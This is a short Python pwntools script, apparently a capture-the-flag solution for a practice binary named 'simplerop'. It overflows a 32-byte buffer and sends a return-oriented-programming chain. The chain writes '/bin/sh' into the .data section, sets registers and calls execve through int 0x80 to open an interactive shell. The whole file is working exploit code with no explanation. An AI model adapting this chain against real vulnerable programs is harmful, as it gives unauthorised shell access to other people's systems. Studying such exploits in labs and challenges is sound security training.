#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

io = process('./simplerop')

#write to memory
p = 'a'*32
p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea060) # @ .data
p += p32(0x080bae06) # pop eax ; ret
p += '/bin'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret
p += p32(0x0806e82a) # pop edx ; ret
p += p32(0x080ea064) # @ .data + 4
p += p32(0x080bae06) # pop eax ; ret
p += '/sh\x00'
p += p32(0x0809a15d) # mov dword ptr [edx], eax ; ret

#write to register
p += p32(0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret
p += p32(0) # 0
p += p32(0) # 0
p += p32(0x080ea060) # @ .data
p += p32(0x080bae06) # pop eax ; ret
p += p32(0xb) # 0xb
p += p32(0x080493e1) # int 0x80
#syscall 0xb ==> execve(/bin/sh,0,0)

io.recvuntil("Your input :")
io.sendline(p)
io.interactive()
